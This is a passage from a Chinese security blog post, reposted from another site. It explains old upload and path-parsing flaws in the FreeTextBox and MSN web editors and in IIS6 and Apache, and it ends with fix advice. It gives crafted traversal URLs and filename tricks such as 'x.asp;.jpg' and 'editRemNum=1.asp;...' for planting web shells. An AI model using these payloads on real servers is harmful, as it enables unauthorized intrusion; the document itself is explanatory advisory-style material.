<h2 id="Freetextbox"><a href="#Freetextbox" class="headerlink" title="Freetextbox"></a>Freetextbox</h2><p>Freetextbox遍历目录漏洞影响版本：未知<br>脆弱描述：<br>因为ftb.imagegallery.aspx代码中 只过滤了/但是没有过滤\符号所以导致出现了遍历目录的问题。<br>攻击利用:<br>在编辑器页面点图片会弹出一个框（抓包得到此地址）构造如下，可遍历目录。<br><a href="http://navisec.it/Member/images/ftb/HelperScripts/ftb.imagegallery.aspx?frame=1&amp;rif=..&amp;cif=\" target="_blank" rel="external">http://navisec.it/Member/images/ftb/HelperScripts/ftb.imagegallery.aspx?frame=1&amp;rif=..&amp;cif=\</a>..</p>
<h3 id="Freetextbox-Asp-Net版利用IIS解析漏洞获得权限"><a href="#Freetextbox-Asp-Net版利用IIS解析漏洞获得权限" class="headerlink" title="Freetextbox Asp.Net版利用IIS解析漏洞获得权限"></a>Freetextbox Asp.Net版利用IIS解析漏洞获得权限</h3><p>影响版本：所有版本<br>脆弱描述：<br>没做登陆验证可以直接访问上传木马<br>Freetextbox 3-3-1 可以直接上传任意格式的文件<br>Freetextbox 1.6.3 及其他版本可以上传 格式为x.asp;.jpg<br>攻击利用：<br>利用IIS解析漏洞拿SHELL。上传后SHELL的路径为<a href="http://navisec.it/images/x.asp;.jpg" target="_blank" rel="external">http://navisec.it/images/x.asp;.jpg</a></p>
<h2 id="Msn-editor"><a href="#Msn-editor" class="headerlink" title="Msn editor"></a>Msn editor</h2><h3 id="利用WIN-2003-IIS文件名称解析漏洞获得SHELL-2"><a href="#利用WIN-2003-IIS文件名称解析漏洞获得SHELL-2" class="headerlink" title="利用WIN 2003 IIS文件名称解析漏洞获得SHELL"></a>利用WIN 2003 IIS文件名称解析漏洞获得SHELL</h3><p>影响版本：未知<br>脆弱描述：<br>点击图片上传后会出现上传页面，地址为<br><a href="http://navisec.it/admin/uploadPic.asp?language=&amp;editImageNum=0&amp;editRemNum=" target="_blank" rel="external">http://navisec.it/admin/uploadPic.asp?language=&amp;editImageNum=0&amp;editRemNum=</a><br>用普通的图片上传后，地址为<br><a href="http://navisec.it/news/uppic/41513102009204012_1.gif" target="_blank" rel="external">http://navisec.it/news/uppic/41513102009204012_1.gif</a><br>记住这时候的路径，再点击图片的上传，这时候地址就变成了<br><a href="http://navisec.it/news/admin/uploadPic.asp?language=&amp;editImageNum=1&amp;editRemNum=41513102009204012" target="_blank" rel="external">http://navisec.it/news/admin/uploadPic.asp?language=&amp;editImageNum=1&amp;editRemNum=41513102009204012</a><br>很明显。图片的地址是根据RemNum后面的编号生成的。<br>攻击利用:<br>配合IIS的解析漏洞，把RemNum后面的数据修改为1.asp;41513102009204012，变成下面这个地址<br><a href="http://navisec.it/admin/uploadPic.asp?language=&amp;editImageNum=0&amp;editRemNum=1.asp;41513102009204012" target="_blank" rel="external">http://navisec.it/admin/uploadPic.asp?language=&amp;editImageNum=0&amp;editRemNum=1.asp;41513102009204012</a><br>然后在浏览器里打开，然后选择你的脚本木马上传，将会返回下面的地址<br>uppic/1.asp;41513102009204012_2.gif<br>直接打开就是我们的小马地址！</p>
<h3 id="附录A-–-Apache文件名解析缺陷漏洞"><a href="#附录A-–-Apache文件名解析缺陷漏洞" class="headerlink" title="附录A – Apache文件名解析缺陷漏洞"></a>附录A – Apache文件名解析缺陷漏洞</h3><p>测试环境:apache 2.0.53 winxp,apache 2.0.52 redhat linux<br>1.国外(SSR TEAM)发了多个advisory称Apache’s MIME module (mod_mime)相关漏洞,就是attack.php.rar会被当做php文件执行的漏洞，包括Discuz!那个p11.php.php.php.php.php.php.php.php.php.php.php.php.rar漏洞。<br>2.S4T的superhei在blog上发布了这个apache的小特性，即apache 是从后面开始检查后缀，按最后一个合法后缀执行。其实只要看一下apache的htdocs那些默认安装的index.XX文件就明白了。<br>3.superhei已经说的非常清楚了，可以充分利用在上传漏洞上，我按照普遍允许上传的文件格式测试了一下，列举如下(乱分类勿怪)<br>典型型:rar<br>备份型:bak,lock<br>流媒体型：wma,wmv,asx,as,mp4,rmvb<br>微软型:sql,chm,hlp,shtml,asp<br>任意型:test,fake,ph4nt0m<br>特殊型:torrent<br>程序型：jsp,c,cpp,pl,cgi<br>4.整个漏洞的关键就是apache的”合法后缀”到底是哪些，不是”合法后缀”的都可以被利用。<br>5.测试环境<br>a.php<br>&lt;? phpinfo();?&gt;<br>然后增加任意后缀测试,a.php.aaa,a.php.aab….<br>By cloie, in ph4nt0m.net(c) Security.</p>
<h3 id="附录B-–-iis文件夹名，解析漏洞"><a href="#附录B-–-iis文件夹名，解析漏洞" class="headerlink" title="附录B – iis文件夹名，解析漏洞"></a>附录B – iis文件夹名，解析漏洞</h3><p>安装了iis6的服务器(windows2003)，受影响的文件名后缀<br>有.asp .asa .cdx .cer .pl .php .cgi<br>Windows 2003 Enterprise Edition是微软目前主流的服务器操作系统。 Windows 2003 IIS6 存在着文件解析路径的漏洞，当文件夹名为类似hack.asp的时候（即文件夹名看起来像一个ASP文件的文件名），此时此文件夹下的任何类型的文件(比如.gif，.jpg，.txt等)都可以在IIS中被当做ASP程序来执行。这样黑客即可上传扩展名为jpg或gif之类的看起来像是图片文件的木马文件，通过访问这个文件即可运行木马。如果这些网站中有任何一个文件夹的名字是以 .asp .php .cer .asa .cgi .pl 等结尾，那么放在这些文件夹下面的任何类型的文件都有可能被认为是脚本文件而交给脚本解析器而执行。</p>
<h3 id="附录C-–-iis文件名，解析漏洞"><a href="#附录C-–-iis文件名，解析漏洞" class="headerlink" title="附录C – iis文件名，解析漏洞"></a>附录C – iis文件名，解析漏洞</h3><p>漏洞描述：<br>当文件名为[YYY].asp;[ZZZ].jpg时，Microsoft IIS会自动以asp格式来进行解析。<br>而当文件名为[YYY].php;[ZZZ].jpg时，Microsoft IIS会自动以php格式来进行解析。<br>其中[YYY]与[ZZZ]处为可变化字符串。<br>影响平台：<br>Windows Server 2000 / 2003 / 2003 R2 (IIS 5.x / 6.0)</p>
<h2 id="修补方法："><a href="#修补方法：" class="headerlink" title="修补方法："></a>修补方法：</h2><p>1、等待微软相关的补丁包<br>2、关闭图片所在目录的脚本执行权限（前提是你的某些图片没有与程序混合存放）<br>3、校验网站程序中所有上传图片的代码段，对形如[YYY].asp;[ZZZ].jpg的图片做拦截<br>备注：<br>对于Windows Server 2008(IIS7)以及Windows Server 2008 R2(IIS7.5) 则未受影响<br>Note:(FW) for <a href="http://www.cnblogs.com/webserverguard/archive/2009/09/14/1566597.html" target="_blank" rel="external">http://www.cnblogs.com/webserverguard/archive/2009/09/14/1566597.html</a><br>——转载于《纳威安全导航》</p>

            <div class="clearfix"></div>
            <hr class="nogutter">
        </div>
        <nav class="pagination" role="pagination">
    
    <a class="pull-left" href="/2017/03/21/TCP-状态控制码（code-Control-Flag）/" style="float: left;">
        ← TCP:状态控制码（code,Control Flag）
    </a>
    
    
    <a class="pull-right" href="/2016/12/17/预防CSRF/">
        预防CSRF攻击 →
    </a>
    
</nav>

        <div class="duoshuo">
<div class="ds-thread" data-thread-key="2017/02/27/编辑器漏洞/" data-title="编辑器漏洞" data-url="http://www.jiadong.xin/2017/02/27/编辑器漏洞/"></div>
<script type="text/javascript">
var duoshuoQuery = {short_name:"dadongge"};
(function() {
	var ds = document.createElement('script');
	ds.type = 'text/javascript';ds.async = true;
	ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
	ds.charset = 'UTF-8';
	(document.getElementsByTagName('head')[0] 
	 || document.getElementsByTagName('body')[0]).appendChild(ds);
})();
</script>
</div>
    </div>
</section>


      
<!-- ============================ Footer =========================== -->

<footer>
    <div class="container">
            <div class="copy">
                <p>
                    &copy; 2014<script>new Date().getFullYear()>2010&&document.write("-"+new Date().getFullYear());</script>, Content By JD. All Rights Reserved.
                </p>
                <p>Theme By <a href="//go.kieran.top" style="color: #767D84">Kieran</a></p>
            </div>
            <div class="social">
                <ul>
                    
                    <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a>&nbsp;</li>
                    
                    
                    <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a>&nbsp;</li>
                    
                    
                    <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a>&nbsp;</li>
                    
                    
                    <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a>&nbsp;</li>
                    
                    
                    <li><a href="http://weibo.com/3908422305/profile?topnav=1&wvr=6&is_all=1" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a>&nbsp;</li>
                    
                </ul>
            </div>
            <div class="clearfix"> </div>
        </div>
</footer>

<!-- ============================ END Footer =========================== -->
      <!-- Load our scripts -->
        
<!-- Resizable 'on-demand' full-height hero -->
<script type="text/javascript">
    
    var resizeHero = function () {
        var hero = $(".cover,.heightblock"),
            window1 = $(window);
        hero.css({
            "height": window1.height()
        });
    };
    
    resizeHero();
    
    $(window).resize(function () {
        resizeHero();
    });
</script>
<script src="/js/plugins.min.js"></script><!-- Bootstrap core and concatenated plugins always load here -->
<script src="/js/jquery.flexslider-min.js"></script><!-- Flexslider plugin -->
<script src="/js/scripts.js"></script><!-- Theme scripts -->

<!-- Initiate flexslider plugin -->
<script type="text/javascript">
    $(document).ready(function($) {
      $('.flexslider').flexslider({
        animation: "fade",
        prevText: "",
        nextText: "",
        directionNav: true
      });
    });
</script>

</body>
</html>
